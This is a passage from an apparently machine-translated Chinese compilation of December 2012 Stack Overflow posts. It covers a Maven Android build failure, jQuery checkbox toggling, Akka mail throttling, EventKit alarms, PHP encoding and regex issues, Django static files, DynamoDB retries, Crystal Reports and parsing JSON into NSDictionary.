        <groupId>deps</groupId>
        <artifactId>dep6</artifactId>
        <version>0.1</version>
        <scope>system</scope>
        <systemPath>${basedir}/bin/classes.dex</systemPath>
    </dependency>
<dependency>
      <groupId>dom4j</groupId>
      <artifactId>dom4j</artifactId>
      <version>1.6.1</version>
      <exclusions>
          <exclusion>
              <groupId>xml-apis</groupId>
              <artifactId>xml-apis</artifactId>
          </exclusion>
      </exclusions>
  </dependency>
</dependencies> 

<profiles>
    <profile>
        <id>emma</id>
        <build>

            <plugins>
                <plugin>
                    <groupId>com.jayway.maven.plugins.android.generation2</groupId>
                    <artifactId>android-maven-plugin</artifactId>
                    <version>3.4.1</version>
                    <configuration>                      <!-- emma start -->
                        <emma>
                            <enable>true</enable>
                            <classFolders>${project.basedir}/target/classes/</classFolders>
                            <outputMetaFile>${project.basedir}/target/emma/coverage.em</outputMetaFile>
                        </emma>                        <!-- emma stop -->
                        <dex>
                            <noLocals>true</noLocals> <!-- must be set for emma -->
                        </dex>

                    </configuration>
                    <extensions>true</extensions>
                </plugin>
            </plugins>
        </build>
    </profile>
</profiles>

<properties>
    <sonar.dynamicAnalysis>reuseReports</sonar.dynamicAnalysis>
    <sonar.emma.reportPath>target/emma/</sonar.emma.reportPath>
    <sonar.surefire.reportsPath>../regalandroid-test/target/surefire-reports</sonar.surefire.reportsPath>
    <sonar.core.codeCoveragePlugin>emma</sonar.core.codeCoveragePlugin>
</properties> 
```

```
 [INFO] Scanning for projects...
    [INFO] ------------------------------------------------------------------------
    [INFO] Reactor Build Order:
    [INFO] 
    [INFO] Hello - Parent
    [INFO] sourcecode - Application
    [INFO] SourceCode - Integration tests
    [INFO]                                                                         
    [INFO] ------------------------------------------------------------------------
    [INFO] Building Hello - Parent 1.0
    [INFO] ------------------------------------------------------------------------
    [INFO] 
    [INFO] --- maven-clean-plugin:2.4.1:clean (default-clean) @ Hello-parent ---
    [INFO] 
    [INFO] --- maven-install-plugin:2.3.1:install (default-install) @ Hello-parent ---
    [INFO] Installing G:\Projects\pom.xml to C:\Users\myuser\.m2\repository\andersen\project\Hello-parent\1.0\Hello-parent-1.0.pom
    [INFO]                                                                         
    [INFO] ------------------------------------------------------------------------
    [INFO] Building SourceCode - Application 1.0
    [INFO] ------------------------------------------------------------------------
    [WARNING] The POM for com.google.android:android:jar:4.0 is missing, no dependency information available
    [WARNING] The POM for android:android:jar:4.0 is missing, no dependency information available
    [INFO]                                                                         
    [INFO] ------------------------------------------------------------------------
    [INFO] Skipping Hello - Parent
    [INFO] This project has been banned from the build due to previous failures.
    [INFO] ------------------------------------------------------------------------
    [INFO] ------------------------------------------------------------------------
    [INFO] Reactor Summary:
    [INFO] 
    [INFO] Hello - Parent .................................... SUCCESS [1.157s]
    [INFO] SourceCode - Application ....................... FAILURE [0.348s]
    [INFO] SourceCode - Integration tests ................. SKIPPED
    [INFO] ------------------------------------------------------------------------
    [INFO] BUILD FAILURE
    [INFO] ------------------------------------------------------------------------
    [INFO] Total time: 3.703s
    [INFO] Finished at: Thu Dec 06 13:32:20 IST 2012
    [INFO] Final Memory: 4M/8M
    [INFO] ------------------------------------------------------------------------
    [ERROR] Failed to execute goal on project SourceCode: Could not resolve dependencies for project andersen.project:SourceCode:jar:1.0: The following artifacts could not be resolved: com.google.android:android:jar:4.0, android:android:jar:4.0: Failure to find com.google.android:android:jar:4.0 in http://repo1.maven.org/maven2 was cached in the local repository, resolution will not be reattempted until the update interval of central has elapsed or updates are forced -> [Help 1]
    [ERROR] 
    [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
    [ERROR] Re-run Maven using the -X switch to enable full debug logging.
    [ERROR] 
    [ERROR] For more information about the errors and possible solutions, please read the following articles:
    [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/DependencyResolutionException
    [ERROR] 
    [ERROR] After correcting the problems, you can resume the build with the command
    [ERROR]   mvn <goals> -rf :SourceCode

It would be great, if anyone give me step by step how to use.

Thanks in Advance 
```

# javascript - 基于 jQuery 中的复选框切换输入上的禁用属性

> ID：13756917
> 
> 赞同：7
> 
> 时间：2012-12-07T04:27:27.723
> 
> 标签：javascript, jquery, forms

我有一个默认未选中的复选框，默认情况下禁用输入。

```
<label class="checkbox span3"><input type="checkbox"> I am a full-time student.</label>
<input class="inputIcon span3" id="disabledInput" type="text" placeholder="Enter School Name" disabled> 
```

我可以完全控制类和 id 名称，并且该站点使用 jQuery，因此可以在需要时使用它或纯 javascript。

如果用户选中该框，则应从以下输入中删除“禁用”属性。如果用户取消选中它应该再次被禁用。

在 StackOverflow 上发现了几个类似的问题，但似乎都不是这个确切的用例。

* * *

## 回答 #1

> 赞同：19
> 
> 时间：2012-12-07T04:30:47.540

您必须将 id 分配给复选框以将点击绑定到特定复选框，

**[现场演示](http://jsfiddle.net/rajaadil/vwsvE/2/)**

```
<input type="checkbox" id="chk">

$("#chk").click(function(){   
    $("#disabledInput").attr('disabled', !this.checked)
}); 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-07T04:30:23.500

首先给你的复选框一个ID

```
<input id='cbFullTime' type="checkbox"> 
```

然后在其单击处理程序中，获取文本框，并将其 disabled**属性设置为复选框**`checked` **属性**的当前值的倒数：

```
$('#cbFullTime').click(function() { 
    var cbIsChecked = $(this).prop('checked');
    $('#disabledInput').prop('disabled', !cbIsChecked); 
}); 
```

* * *

请注意，虽然使用`attr`and`removeAttr`会起作用（假设您没有完全使用 jQuery 1.6），但使用该`prop`函数更简单，也更正确。有关更多信息，请查看[此链接](http://blog.jquery.com/2011/05/10/jquery-1-6-1-rc-1-released/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-07T04:34:31.587

试试下面

```
$(".checkbox").find("checkbox").click(function() { 
$('#disabledInput').prop('disabled', $(this).prop('checked')); 
}); 
```

# scala - 如何使用 Akka 控制流量？

> ID：13756920
> 
> 赞同：0
> 
> 时间：2012-12-07T04:27:58.457
> 
> 标签：scala, akka

我读过使用 Akka 时的一条重要规则是避免任何阻塞输入/输出操作、轮询、忙等待、睡眠等。但是如果我真的需要一些流控制怎么办？

我正在使用 Akka Actor 向我们的客户发送邮件，并且为了对邮件服务器友好，每 5 秒发送一封邮件。我的计划是使用调度员执行流程控制和发送方执行邮件发送工作。

```
class Dispatcher extends Actor {
  def receive = {
    case ResetPassword(to, data) => 
      senderActor ! Mail("resetPassword", to, data)
      Thread.sleep(5000)
    ...
  }
}
class Sender extends Actor {
  def receive = {
    case Mail(to, data) => // send the mail immediately
    ...
  }
} 
```

这是正确的方法吗？如果没有，我应该如何进行流量控制？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-07T04:52:16.463

在不阻塞的情况下执行此操作的一种方法是让另一个参与者随时保持发件箱状态。

```
class Outbox extends Actor {

  var outbox: List[Mail] = Nil  

  def receive = {
    case a: Mail => {
      outbox = outbox :+ a
    }

    case MailToSend => {
      val maybeMailToSend = outbox.headOption
      outbox = outbox.tail
      senderActor ! maybeMailToSend
    }
  }
} 
```

然后让`Sender`演员成为每 5 秒轮询发件箱的[预定演员](http://doc.akka.io/docs/akka/2.0/scala/scheduler.html)。它向参与者发送一条询问`MailToSend`消息，`Outbox`如果响应为 Some，则发送一封邮件。

它看起来像这样：

调度发件人演员：

```
system.scheduler.scheduleOnce(5 seconds, senderActor, PollOutbox) 
```

发件人演员：

```
class Sender extends Actor {
  def receive = {
    case PollOutbox => {
      maybeMailToSend = outboxActor ? MailToSend
      ...
    }
  }
} 
```

# iphone - 使用 EventKit.framework 在 iPhone 的本地日历中存储事件

> ID：13756922
> 
> 赞同：0
> 
> 时间：2012-12-07T04:28:28.163
> 
> 标签：iphone, ios, events, calendar, eventkit

我正在尝试使用 EventKit.framework 在 iPhone 日历中保存事件。它完美保存，但我想将警报设置为“NONE”，但默认情况下需要“30 分钟前”作为警报。我怎么解决这个问题？这是我在 iPhone 日历中保存事件的代码

```
if ([appDelegate.objEvent.event_alert intValue]==0) {
        alarm1 = [EKAlarm alarmWithRelativeOffset:0];
    }
    else if ([appDelegate.objEvent.event_alert intValue]==1) {
        alarm1 = [EKAlarm alarmWithRelativeOffset:-5];
    }
    else if ([appDelegate.objEvent.event_alert intValue]==2) {
        alarm1 = [EKAlarm alarmWithRelativeOffset:-300];
    }
    else if ([appDelegate.objEvent.event_alert intValue]==3) {
        alarm1 = [EKAlarm alarmWithRelativeOffset:-900];
    }
    else if ([appDelegate.objEvent.event_alert intValue]==4) {
        alarm1 = [EKAlarm alarmWithRelativeOffset:-1800];
    }
    else if ([appDelegate.objEvent.event_alert intValue]==5) {
        alarm1 = [EKAlarm alarmWithRelativeOffset:-3600];
    }
    else if ([appDelegate.objEvent.event_alert intValue]==6) {
        alarm1 = [EKAlarm alarmWithRelativeOffset:-7200];
    }
    else if ([appDelegate.objEvent.event_alert intValue]==7) {
        alarm1 = [EKAlarm alarmWithRelativeOffset:-86400];
    }
    else if ([appDelegate.objEvent.event_alert intValue]==8) {//B4 2 days
        alarm1 = [EKAlarm alarmWithRelativeOffset:-172800];
    }

    NSMutableArray *myAlarmsArray = [[NSMutableArray alloc] init];

//    [myAlarmsArray addObject:alarm1];

//    event.alarms = myAlarmsArray;
//    [myAlarmsArray release];

    if ([appDelegate.objEvent.event_alert intValue]!=0)
    {
        [myAlarmsArray addObject:alarm1];
        event.alarms = myAlarmsArray;
    }
    else
    {
//        [myAlarmsArray addObject:nil];
//        event.alarms = nil;
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T05:18:13.207

根据文档，如果您想要触发警报，如您所说的 NONE，我假设您的意思是在事件发生的确切时间触发，您将使用以下代码

```
[EKAlarm alarmWithAbsoluteDate:date]; 
```

[链接到此文档](http://developer.apple.com/library/ios/#documentation/EventKit/Reference/EKAlarmClassRef/EKAlarmClassReference/EKAlarmClassReference.html)

# php - PHP字符串比较不起作用，文件读取

> ID：13756923
> 
> 赞同：2
> 
> 时间：2012-12-07T04:28:48.930
> 
> 标签：php, string, comparison

我正在使用 PHP 读取制表符分隔的 CSV 文件和管道分隔的 TXT 文件。不幸的是，即使字符（看起来）完全相同，我也无法进行字符串比较。我使用修剪来确保清理隐藏的字符，甚至尝试将类型转换为字符串。

Var dump 显示它们明显不同，但我不确定如何使它们相同？

```
// read in CSV file
$fh = fopen($mapping_date, 'r');
$mapping_data = fread($fh, filesize($mapping_date));
... 
// use str_getcsv to put each line into an array
// get values out that I want to compare

$this_strategy = (string)trim($strategy_name);
$row_strategy = (string)trim($row3[_Strategy_Name]);

if($this_strategy == $row_strategy) { // do something }

var_dump($this_strategy); 
```

Vardump: string(16) "低支出 ($0.2)"

```
var_dump($row_strategy); 
```

Vardump: string(31) "低支出 ($0.2)"

无法弄清楚我的生活如何使这项工作。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T05:03:21.497

看起来你有用 UCS2 编码的数据库（假设它是 MySQL）。[http://dev.mysql.com/doc/refman/5.1/en/charset-unicode-ucs2.html](http://dev.mysql.com/doc/refman/5.1/en/charset-unicode-ucs2.html)

您可以使用可能使用[iconv](http://php.net/manual/en/function.iconv.php)来转换格式 - 但该页面上的评论中有一个示例（但它不使用 iconv - [http://php.net/manual/en/function.iconv.php#49171](http://php.net/manual/en/function.iconv.php#49171)） . 我没有测试过。

或者，将数据库字段编码更改为 utf8_generic 或 ASCII 或文件编码为什么？

* * *

编辑：找到你想要的实际 PHP 函数：[mb_convert_encoding](http://au1.php.net/mb_convert_encoding) - UCS2 是支持的编码之一，所以在 php ini 中启用它，你很高兴。

# php - 使用 php 从第一张图片获取 src 时出错？

> ID：13756924
> 
> 赞同：1
> 
> 时间：2012-12-07T04:28:54.963
> 
> 标签：php

我有一个示例代码：

```
$content = 'I have a image <img border="0" alt="581.jpg - 58.03 KB" src="581.jpg">'; 
```

和 php

```
preg_match('/<img.+src=[\'"](?P<src>.+)[\'"].*>/i', $content, $image);
echo $image[0]; 
```

结果是：`581.jpg" border="0" alt="581.jpg -`，如何解决？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-05-30T12:48:05.370

为此编写正则表达式是……至少可以说是有问题的。我建议使用这个：

```
$dom = new DOMDocument;
$dom->loadHTML($content);
foreach ($dom->getElementsByTagName('img') as $node) {
    echo $node->getAttribute('src') . PHP_EOL;
} 
```

**解释：**

您不应该将正则表达式用于您想要的原因是 HTML 的标记各不相同。属性的位置`src`可以不同，它可能使用单引号而不是双引号（一些HTML属性不需要引号，例如这个语法是正确的`<img class=logo />`：），它可能是大写的，可能还有其他我想不到的问题现在的。

**额外信息：**

*   [获取 A 元素的 href 属性](https://stackoverflow.com/questions/3820666/grabbing-the-href-attribute-of-an-a-element)

# python - 我如何从 django 的 diff 目录中提供 html 文件

> ID：13756926
> 
> 赞同：1
> 
> 时间：2012-12-07T04:29:15.420
> 
> 标签：python, django

我需要制作一个应用程序，其中我有现成的独立 html 模板可用

`app/ready_templates/template1`

现在我制作了一个视图，在其中显示该模板的名称、缩略图以显示给用户

但是那里有演示链接，我希望他们看到整个模板。

基本上，如果他们点击演示，那么我想将他们重定向到

`template1/index.html`这样他们就可以看到所有模板图像、js 等，而无需将任何内容链接到 django 视图

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T05:03:25.883

所以你的要求似乎很简单。您可以使用Django 中的[静态文件功能来执行此操作。](https://docs.djangoproject.com/en/1.4/ref/contrib/staticfiles/)基本上，只要你有一堆静态内容，如 html、css、js 图像，你就把它放在你的应用程序中一个名为`static`. 例如，Django 附带的管理应用程序在`django/contrib/admin/static`. 然后你可以在你的 django 模板中放置一些像下面这样简单的东西来链接到静态内容。您当然不必像 template1 那样对每个名称进行硬编码，您可以在 django 模板中动态生成它。

```
{% load static from staticfiles %}
<a href="{% static "template1/index.html" %}" />template1</a> 
```

# php - 在 iframe 上使用局部变量作为 src

> ID：13756931
> 
> 赞同：0
> 
> 时间：2012-12-07T04:29:46.463
> 
> 标签：php, variables, iframe, src

我需要使用变量 $data 中的输出并将其放入 iframe（或其他可能）中，以便正确滚动它。请找出以下代码中的错误：

```
 <?php

    $url = 'http://lema.rae.es/drae/srv/search?id=IwxflJmT9DXX2DMkYs8Z';

    $css = <<<EOT

    <style type="text/css">
     body
       {
       background: #eeeeee;
       }
     .a
       {
        color: green;
       }
    .f
       {
        font-size: 200%;
       }
    .o
       {
        font-size: 80%;
        }
    img
        {
        visibility:hidden;
         }

    </style>
    EOT;

    $data = file_get_contents($url);
    $data = str_replace('</head>', $css.'</head>', $data);
    echo "<iframe id='first' src='$data'
          frameborder='0' 
          width='400px' 
          height='300px' 
          scrolling='yes'
          border-style: none;></iframe>";
    ?> 
```

问题可能在最后几行。iframe 中没有出现该词的定义，而是显示了一个错误，指出尚未找到该对象 谢谢！ ![在此处输入图像描述](../Images/153de36e4a1e251e2104a9b3b0585dbf.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T04:57:07.990

更改`<iframe>`为下面给出的 iframe 代码：

```
<?php

$url = 'http://lema.rae.es/drae/srv/search?id=IwxflJmT9DXX2DMkYs8Z';

$css = <<<EOT

<style type="text/css">
 body
   {
   background: #eeeeee;
   }
 .a
   {
    color: green;
   }
.f
   {
    font-size: 200%;
   }
.o
   {
    font-size: 80%;
    }
img
    {
    visibility:hidden;
     }

</style>
EOT;

$data = file_get_contents($url);
$data = str_replace('</head>', $css.'</head>', $data);
/*u have to change src like this. and you need to add style attribute to use border-style: none;
   /* echo "<iframe id='first' src='".$data."'
      frameborder='0' 
      width='400px' 
      height='300px' 
      scrolling='yes'
      style='border-style:none;'></iframe>"; */
//Remove this iframe and simply echo $data
echo '<div style="overflow:scroll;">'.$data.'</div>'; //YOU CAN USE AUTO instead of SCROLL
?> 
```

我得到的输出如下：（我已经设置`height:200px; width:500px;`）

![在此处输入图像描述](../Images/8f19106198b687ad60564646be41e8f3.png)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-07T04:31:55.810

元素的`src`属性`<iframe/>`采用 URL，而不是 HTML 源......

我不完全确定你想做什么，但也许你只需要`echo`你的`$data`？

# php - 使用php从文本中删除所有url

> ID：13756938
> 
> 赞同：5
> 
> 时间：2012-12-07T04:31:07.260
> 
> 标签：php, regex

> **可能重复：**
> [使用 PHP 删除 url](https://stackoverflow.com/questions/5844442/remove-urls-using-php)

我正在尝试找出使用 php 从文本中删除 URL 的最佳方法。我在这里查看了许多不同的站点和问题，但无法将它们完全拼凑在一起。

我想删除所有如下 URL：

1.  www.website.com
2.  http://www.website.com
3.  网站.com
4.  website.com/test
5.  <tag>www.website.com</tag>（其中 <tag> 是任何 html 标签）
6.  (www.website.com)

我已经尝试了一些我在这里找到的解决方案，但我无法弄清楚如何获取带有不属于网址一部分的边框字符的网址，即括号或像 <strong> 这样的 HTML 标记

任何帮助深表感谢。

谢谢

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-07T04:40:00.707

也许...

```
// http(s)://
    $txt = preg_replace('|https?://www\.[a-z\.0-9]+|i', '', $txt);
    // only www.
    $txt = preg_replace('|www\.[a-z\.0-9]+|i', '', $txt); 
```

或者：

```
$Var = str_replace("itemtoreplace", "replacewith", $variabletoremovefrom"); 
```

[PHP Str_replace](http://uk1.php.net/manual/en/function.str-replace.php)

使用： [使用 PHP 删除 url](https://stackoverflow.com/questions/5844442/remove-urls-using-php?rq=1)

以供参考。

# php - PDF打开HTML文件时不支持中文

> ID：13756939
> 
> 赞同：0
> 
> 时间：2012-12-07T04:31:10.757
> 
> 标签：php, html, pdf, character-encoding

我得到一个 HTML 文件并以 PDF 格式打开它。它适用于 en、cz、pl、ru 语言，但对于中文，它不显示字符，而是显示框。请看图片。我的代码是：

```
header("Cache-Control: no-cache");
header("Content-Description: File Transfer");
header("Content-Disposition: attachment; filename=$html_file.pdf");
header("Content-Type: application/pdf");
header("Content-Transfer-Encoding: UTF-8"); 
```

在 $html_file 我正在使用：

```
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
```

HTML 文件适用于包括中文在内的所有语言。

![在此处输入图像描述](../Images/c93186b52107ea416cd3fcfbfb3297ca.png)

# python - 使用脚本在 IDLE 中设置变量

> ID：13756941
> 
> 赞同：3
> 
> 时间：2012-12-07T04:31:25.670
> 
> 标签：python, python-3.x, beautifulsoup, python-idle

在 Win7 x64 上使用 Python 3.2。我有一个每次启动 IDLE 时都想运行的脚本。这是我的脚本：

```
import sys
from bs4 import BeautifulSoup

sys.setrecursionlimit(2000)

soup = BeautifulSoup()
def soupSetup(file_name, encode_type):
    soup = BeautifulSoup(open("C:\\Python32\\html\\"+file_name+".html", encoding=encode_type)) 
```

这样一切都设置好了，我所要做的就是传递`soupSetup()`我想要使用的 html 文件，然后我就可以开始处理数据了。

我的问题是 - 如果我在使用时按原样使用代码，`print(soup.prettify())`除了空行之外什么也没有返回。如果我在运行 print 语句时没有先实例化该类，我会得到：

```
Traceback (most recent call last):
  File "<pyshell#22>", line 1, in <module>
    print(soup.prettify())
NameError: name 'soup' is not defined 
```

对于那些不熟悉 BeautifulSoup 汤的人来说，就是`<class 'bs4.BeautifulSoup'>`.

如何使汤对象在我的脚本之外持续存在？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-07T05:18:18.153

`soup`您使用您的语句为模块创建一个全局名称`soup = BeautifulSoup()`。然后，在函数中，`soupSetup`您想将`soup`名称重新分配给另一个`BeautifulSoup()`对象，这次是数据。

但是：函数内部的名称是该函数的本地名称，并且不会在该函数之外持续存在。因此，您最终不会重新分配全局`soup`名称，而是在函数内部创建一个新的单独`soup`变量，然后在函数存在时将其删除。全局`soup`没有被改变。这就是为什么您在使用该`soup`变量时会获得首先创建的空的 BeatifulSoup() 对象。

您需要做的是告诉函数您要重新分配全局名称，如下所示：

```
def soupSetup(file_name, encode_type):
    global soup
    soup = BeautifulSoup(open("C:\\Python32\\html\\"+file_name+".html", encoding=encode_type)) 
```

那应该这样做。此外，您不必设置`soup = BeautifulSoup()`，设置为什么都没有关系，因为它将被函数覆盖。只需这样做：

```
soup = None 
```

完整的代码最终应为：

```
import sys
from bs4 import BeautifulSoup

sys.setrecursionlimit(2000)

soup = None
def soupSetup(file_name, encode_type):
    global soup
    soup = BeautifulSoup(open("C:\\Python32\\html\\"+file_name+".html", encoding=encode_type)) 
```

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-07T12:35:19.840

两个问题合二为一。

关于启动时要执行的代码的第一个问题是通过根据[http://docs.python.org/dev/library/site.html](http://docs.python.org/dev/library/site.html)在某个目录中创建模块 usercustomize/sitecustomize 来解决的。

现在第二个问题可以通过扩充来解决`__builtin__`：

```
import __builtin__
setattr(__builtin__, 'soup', soup) 
```

在启动模块上（在适当的位置），然后汤将神奇地在其他任何地方可用。我不建议这样做，您可能需要重新考虑您想要实现的目标。此外，在您当前的方法中，您重新定义`soup`inside `soupSetup`。因此，在该函数中，您需要指定要重新定义全局变量而不是创建局部变量：

```
def soupSetup(...):
    global soup
    ... 
```

# php - 重复受限制的 DynamoDB 请求

> ID：13756952
> 
> 赞同：1
> 
> 时间：2012-12-07T04:32:24.477
> 
> 标签：php, amazon-dynamodb, throttling

我正在使用适用于 PHP 的 AWS 开发工具包以编程方式与 DynamoDB 交互。

我想检测对 DynamoDB 的请求是否受到限制，以便在短暂延迟后发出另一个请求。

现在，我在假设未满足限制请求的情况下进行操作。[Amazon FAQs](http://aws.amazon.com/dynamodb/faqs/#What_happens_if_my_application_performs_more_reads_or_writes_than_my_provisioned_capacity)建议在发生限制时返回 400 错误。

所以我目前的逻辑看起来像这样：

```
for( $i=0; $i<10; $i++ ) {

    $response = $dynamodb->get_item($get_item_args);

    if( $response->isOK() ) {

        break;

    } elseif( $i < 9 ) {

        sleep(1);
    }
} 
```

我想这可行，但它*有点*愚蠢。特别是，它将重复所有失败的请求，而不仅仅是受限制的请求。如果出现不可解决的错误，我真的不想重复请求。

为了使它更智能，我想在一个受限制的响应中查看一个唯一标识符（即特定的错误消息）。但是对于我的一生，我无法捕获（或在互联网上的任何地方找到）样本限制响应。

补偿限制风险和最大化满足请求的可能性的最佳方法是什么？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-08T18:16:01.803

事实证明，AWS 开发工具包将自动重试受限制的请求，直到成功。所以我上面的努力是不必要的（因为我使用的是 AWS SDK for PHP）。

[Amazon DynamoDB](http://docs.amazonwebservices.com/amazondynamodb/2011-12-05/developerguide/ErrorHandling.html)文档页面中的处理错误对 ProvisionedThroughputExceededException 错误说明如下：

> 适用于 Amazon DynamoDB 的 AWS 开发工具包会自动重试收到此异常的请求。因此，您的请求最终会成功，除非请求太大或您的重试队列太大而无法完成。

# asp.net-mvc - 如何在 MVC 4 中从数据库加载 Crystal Report？

> ID：13756958
> 
> 赞同：4
> 
> 时间：2012-12-07T04:33:25.903
> 
> 标签：asp.net-mvc, crystal-reports

我有一个名为 ReportRepository 的对象，它将生成的报告存储到数据库中。我想让用户能够查看这些报告，因此我将数据拉回字节数组中。下面是我用来保存报告和查看报告的逻辑的代码片段。当我尝试在第二种方法中加载报表时，页面抛出以下异常：“不支持的操作。由 JRC 引擎处理的文档无法在 C++ 堆栈中打开。” 我只想查看我存储的报告，这样做的正确方法是什么？

编辑：我还想补充一点，我已经将第一个方法更改为 ExportToHTTPResponse 而不是导出到 Stream 只是为了确保报告实际上是在浏览器中正确生成的。我可以确认它正在生成并且 Chrome 可以很好地查看 PDF。

```
 public static void GenerateReport()
    {
        ReportDocument report = new ReportDocument();
        string strRptPath = System.Web.HttpContext.Current.Server.MapPath("~/") + "Reports//" + "ProgressReport.rpt";
        report.Load(strRptPath);

        report.VerifyDatabase();

        Stream pdfStream = report.ExportToStream(ExportFormatType.PortableDocFormat);
        byte[] arr = new byte[pdfStream.Length];
        pdfStream.Read(arr, 0, (int)pdfStream.Length);

        ReportModel model = new ReportModel();

        model.ReportData = arr;
        model.ReportName = "TestReport";

        ReportRepository repo = new ReportRepository();
        repo.AddReport(model);
    }

    public static void ViewStoredReport(string id)
    {
        ReportDocument report = new ReportDocument();
        ReportModel model = new ReportModel();
        ReportRepository repo = new ReportRepository();

        model = repo.LoadReport(id);

        string strRptPath = System.Web.HttpContext.Current.Server.MapPath("~/") + "Reports//" + "ProgressReport.rpt";
        FileStream oFileStream = new FileStream(strRptPath, FileMode.Create);
        oFileStream.Write(model.ReportData, 0, model.ReportData.Length);
        oFileStream.Close();
        oFileStream.Dispose();

        report.Load(strRptPath);
        report.ExportToHttpResponse(ExportFormatType.PortableDocFormat, null, false, "progressreport");
    } 
```

# c - 从 e 的函数中找到最小数（命名为“n”）

> ID：13756962
> 
> 赞同：0
> 
> 时间：2012-12-07T04:34:12.620
> 
> 标签：c

好吧，我真的需要有人帮我解决这个问题。谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-07T04:55:07.453

使用代数和`e`函数定义，`|e(n) - e(n+1)| < x`可以简化为`(1/n!) < x`，可以展开为`(1/1) * (1/2) * (1/3) * ... * (1/n) < x`。

```
int minN(double x) {
    double sum = 1;
    int n;
    for(n = 0; sum >= x; n++) {
       sum *= 1/(n+1);
    }
    return n;
} 
```

# objective-c - 我的 NSDictionary 的密钥是什么

> ID：13756968
> 
> 赞同：3
> 
> 时间：2012-12-07T04:34:39.917
> 
> 标签：objective-c, ios, json, nsdictionary

我已经从 JSON 文件创建了一个 NSDictionary，但是当我尝试这样做时

```
NSString *key = [NSString stringWithFormat:@"%i",indexPath.row];
NSDictionary *currentObject = [JSONdata objectForKey:key]; 
```

我错误接收和错误`-[__NSCFArray objectForKey:]: unrecognized selector sent to instance`

当我这样做`NSLog`时，`JSONdata`这是我的输出：

```
(
    {
        1 =         {
            description = "";
            facets =             (
                                {
                    name = Red;
                },
                                {
                    name = Blue;
                },
                                {
                    name = Skinny;
                },
                                {
                    name = Standard;
                },
                                {
                    name = "Navy Blue";
                }
            );
            id = 1073;
            owner = 1001;
            "post_date" = 1341980987;
            transaction = 24;
            username = TonyB;
        };
    },
    {
        2 =         {
            description = "";
            facets =             (
                                {
                    name = "Bow Tie";
                },
                                {
                    name = Blue;
                },
                                {
                    name = Orange;
                },
                                {
                    name = Yellow;
                }
            );
            id = 1001;
            owner = 1001;
            "post_date" = 1340640012;
            transaction = 6;
            username = TonyB;
        };
    }
) 
```

我是否更正认为我应该能够获得的第一组密钥应该是`1`并`2`使用`[JSONdata objectForKey:@"0"]`or `[JSONdata objectForKey:@"1"]`？还是我错过了什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-07T04:38:05.137

您的 JSON 的结构如下

包含 NSDictionary 的 NSArray

所以你需要这样做：`[[JSONdata objectAtIndex:0] objectForKey:@"1"]`

* * *

此外，当您有疑问时，您可以随时这样做：
`NSLog(@"JSONdata class == %@", [JSONdata class]);`

当你点击一个[NSDictionary](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSDictionary_Class/Reference/Reference.html)时，你总是有这个方法：`- (NSArray *)allKeys`它将返回一个包含该字典所有键的数组。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-07T04:37:15.833

你有`NSArray`然后`NSDictionary`。此外，您发送`key`的`NSString`位置是`int`json 中的。会是这样吗？

这有帮助吗`[[JSONdata objectAtIndex:0] objectForKey:@"1"];`

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-07T04:39:12.597

试试这个，

```
NSArray *currentObject = [JSONdata valueForKey:key]; 
```

您的 JSONdata 是一个数组而不是字典。所以那没有任何`objectForKey`方法。上面的将调用[`valueForKey`其对象](http://developer.apple.com/library/mac/documentation/Cocoa/Reference/Foundation/Classes/NSArray_Class/NSArray.html#//apple_ref/occ/instm/NSArray/valueForKey%3a)并将结果作为数组返回。如果你只想访问第一个对象，你也可以直接使用`[[JSONdata objectAtIndex:0] objectForKey:key];`。如果使用上述的，只需使用

```
NSDictionary *currentDict = [currentObject objectAtIndex:0]; 
```

理想情况下，一个简单的解决方案如下所示，

```
NSString *key = [NSString stringWithFormat:@"%i",indexPath.row];
NSDictionary *currentObject = [[JSONdata objectAtIndex:(indexPath.row - 1)] valueForKey:key]; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-07T04:43:44.487

这是一个非常奇怪的 JSON 布局。这是一个字典数组，其中每个字典都有一个键（每个键都不同），其对象是字典。我建议一个简单的字典数组。

因此，您可能拥有以下 PHP。我假设您正在从数据库或其他东西中读取数据，但它会让您了解我建议的 JSON 结构，这只是一个字典数组。我也简化`facets`了，但你是否走得那么远取决于你。但关键问题是 PHP 只是生成一个简单的字典数组：

```
<?php

    $object1 = array(
                   "description" => "", 
                   "facets" => array (
                       "Red",
                       "Blue",
                       "Skinny",
                       "Standard",
                       "Navy Blue"
                    ),
                    "id" => 1073,
                    "owner" => 1001,
                    "post_date" => 1341980987,
                    "transaction" => 24,
                    "username" => "TonyB");

    $object2 = array(
                   "description" => "", 
                   "facets" => array (
                       "Bow tie",
                       "Blue",
                       "Orange",
                       "Yellow"
                    ),
                    "id" => 1071,
                    "owner" => 1001,
                    "post_date" => 1340640012,
                    "transaction" => 6,
                    "username" => "TonyB");

    $results = array($object1, $object2);

    echo json_encode($results);

?> 
```

这将生成以下 JSON（我已经美化了）：

```
[
    {
        "description" : "",
        "facets" : [
             "Red",
             "Blue",
             "Skinny",
             "Standard",
             "Navy Blue"
        ],
        "id" : 1073,
        "owner" : 1001,
        "post_date" : 1341980987,
        "transaction" : 24,
        "username" : "TonyB"
    },
    {
        "description" : "",
        "facets" : [
             "Bow tie",
             "Blue",
             "Orange",
             "Yellow"
        ],
        "id" : 1071,
        "owner" : 1001,
        "post_date" : 1340640012,
